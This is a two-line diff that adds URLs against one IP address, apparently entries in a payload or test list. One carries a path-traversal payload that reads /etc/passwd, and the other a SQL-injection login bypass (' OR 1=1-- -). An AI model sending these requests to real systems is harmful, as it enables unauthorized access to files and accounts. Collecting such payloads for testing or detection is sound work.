@@ -1,0 +1,2 @@
+http://45.33.32.156/index.php?page=../../../../etc/passwd
+http://45.33.32.156/login.php?user=' OR 1=1-- -
